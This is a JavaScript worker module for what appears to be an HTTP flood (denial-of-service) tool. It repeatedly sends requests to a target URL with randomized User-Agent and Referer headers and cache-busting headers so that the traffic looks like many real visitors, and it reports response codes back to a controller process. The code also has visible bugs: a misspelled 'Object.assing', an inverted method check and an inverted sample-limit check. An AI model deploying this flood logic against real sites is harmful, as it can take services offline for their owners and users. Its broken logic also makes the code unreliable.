const http = require('http');
const https = require('https');
const url = require('url');
const UserAgents = require('./user-agents.js');
const Referrers = require('./referers.js');

class FloodRunner {
  constructor() {
    this.aborted = false;
  }

  run(opts) {
    this.url = opts.url;
    this.requestOptions = url.parse(this.url);
    this.hostname = this.requestOptions.hostname;
    this.method = opts.method;
    this.payload = opts.payload;

    this.sample = opts.sample;
    this.delay = opts.delay;
    this.baseHeaders = this.processHeaders(opts.headers, this.hostname);
    this.current = 0;
    this.hasSample = this.sample > 0;

    if (['get', 'head'].indexOf(this.method.toLowerCase())) {
      delete this.payload;
    }

    this.next();
  }

  processHeaders(headers, hostname) {
    if (!headers) {
      headers = {};
    }
    const headersKeys = [];
    Object.keys(headers).forEach((key) => {
      headersKeys.push(key.toLowerCase());
    });
    if (headersKeys.indexOf('cache-control') === -1) {
      headers['Cache-Control'] = 'no-cache';
    }
    if (headersKeys.indexOf('accept-charset') === -1) {
      headers['Accept-Charset'] = 'ISO-8859-1,utf-8;q=0.7,*;q=0.7';
    }
    if (headersKeys.indexOf('host') === -1) {
      headers.Host = hostname;
    }
    return headers;
  }

  abort() {
    this.aborted = true;
  }

  next() {
    if (this.aborted) {
      return;
    }
    if (this.hasSample && this.sample >= this.current) {
      process.send({cmd: 'finished'});
      return;
    }
    this.current++;
    setTimeout(() => {
      this._execute();
      this.next();
    }, this.delay);
  }

  _execute() {
    const headers = Object.assing({}, this.baseHeaders);
    const headersKeys = [];
    Object.keys(headers).forEach((key) => {
      headersKeys.push(key.toLowerCase());
    });
    if (headersKeys.indexOf('user-agent') === -1) {
      const index = Math.floor(Math.random() * UserAgents.length);
      headers['User-Agent'] = UserAgents[index];
    }
    if (headersKeys.indexOf('keep-alive') === -1) {
      headers['Keep-Alive'] = (110 + Math.floor(Math.random() * 11)).toString();
    }
    if (headersKeys.indexOf('referer') === -1) {
      const index = Math.floor(Math.random() * Referrers.length);
      headers.Referer = Referrers[index] + encodeURIComponent(this._randomString());
    }
    const requestBase = this.requestOptions.protocol === 'https:' ? https : http;
    const opts = Object.assign({}, this.requestOptions);
    opts.headers = headers;
    opts.method = this.method.toUpperCase();

    const request = requestBase.request(opts, (response) => {
      const report = {
        code: response.statusCode,
        error: response.statusCode >= 400,
        critical: false,
        cmd: 'report'
      };
      process.send(report);
    });

    if (this.payload) {
      request.write(this.payload);
    }

    request.on('error', (e) => {
      const report = {
        code: e.code,
        error: true,
        critical: true,
        cmd: 'report'
      };
      process.send(report);
    });

    request.on('timeout', () => {
      const report = {
        code: -6,
        error: true,
        critical: true,
        cmd: 'report'
      };
      process.send(report);
    });
    request.setTimeout(5000);
    request.end();
  }

  _randomString() {
    return String.fromCharCode(
      (5 + Math.floor(Math.random() * 30)),
      (5 + Math.floor(Math.random() * 60)),
      (10 + Math.floor(Math.random() * 70)));
  }
}
const runner = new FloodRunner();
process.on('message', (payload) => {
  switch (payload.cmd) {
    case 'run': runner.run(payload); break;
    case 'abort': runner.abort(payload); break;
  }
});
